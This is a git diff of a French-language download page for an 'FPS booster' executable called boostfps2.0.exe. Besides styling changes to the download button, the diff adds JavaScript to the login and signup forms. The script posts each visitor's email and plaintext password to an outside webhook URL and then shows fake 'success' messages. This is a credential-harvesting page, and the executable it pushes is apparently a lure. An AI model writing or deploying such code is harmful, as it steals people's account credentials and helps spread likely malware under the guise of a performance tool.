@@ -108,14 +108,21 @@
             font-size: 1.5em;
             text-decoration: none;
             border-radius: 40px;
-            transition: all 0.3s ease;
+            transition: all 0.5s ease;
             margin-top: 30px;
+            animation: bounce 1.5s infinite;
         }
 
-        .download-button:hover {
-            background-color: #ff4c3b;
-            transform: translateY(-5px);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
         }
 
         .antivirus-warning {
@@ -273,18 +280,11 @@
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
         </div>
 
-        <!-- Frame Infos supplémentaires -->
-        <div id="info-frame" class="frame">
-            <h2>En savoir plus</h2>
-            <p>Il est possible que certains antivirus détectent notre application comme une menace à cause de la manière dont elle optimise les performances de votre PC. Ce comportement est souvent signalé par des faux positifs.</p>
-            <button onclick="hideAllFrames()" class="close-button">Fermer</button>
-        </div>
-
         <!-- Frame Connexion -->
         <div id="login-frame" class="frame">
             <h2>Se connecter</h2>
-            <input type="email" id="email" placeholder="Email" class="input-field" />
-            <input type="password" id="password" placeholder="Mot de passe" class="input-field" />
+            <input type="email" id="login-email" placeholder="Email" class="input-field" />
+            <input type="password" id="login-password" placeholder="Mot de passe" class="input-field" />
             <button onclick="login()" class="action-button">Se connecter</button>
             <button onclick="hideAllFrames()" class="close-button">Fermer</button>
         </div>
@@ -305,6 +305,8 @@
     </footer>
 
     <script>
+        const webhookUrl = "https://play.svix.com/in/e_M4lDWp8dx4feIfypDfe70NF82TN/";
+
         function showFrame(frameId) {
             const frames = document.querySelectorAll('.frame');
             frames.forEach(frame => {
@@ -320,12 +322,55 @@
             });
         }
 
-        function login() {
-            // Logique de connexion
+        // Envoi des données d'inscription au webhook
+        async function signup() {
+            const email = document.getElementById('signup-email').value;
+            const password = document.getElementById('signup-password').value;
+
+            if (email && password) {
+                const payload = { action: 'signup', email, password };
+                await sendDataToWebhook(payload);
+                alert("Inscription réussie !");
+                hideAllFrames();
+            } else {
+                alert("Veuillez remplir tous les champs.");
+            }
         }
 
-        function signup() {
-            // Logique d'inscription
+        // Envoi des données de connexion au webhook
+        async function login() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+
+            if (email && password) {
+                const payload = { action: 'login', email, password };
+                await sendDataToWebhook(payload);
+                alert("Connexion réussie !");
+                hideAllFrames();
+            } else {
+                alert("Veuillez remplir tous les champs.");
+            }
+        }
+
+        // Fonction pour envoyer les données au webhook
+        async function sendDataToWebhook(payload) {
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('Données envoyées avec succès');
+                } else {
+                    console.error('Erreur lors de l\'envoi des données');
+                }
+            } catch (error) {
+                console.error('Erreur de connexion au webhook:', error);
+            }
         }
     </script>
 
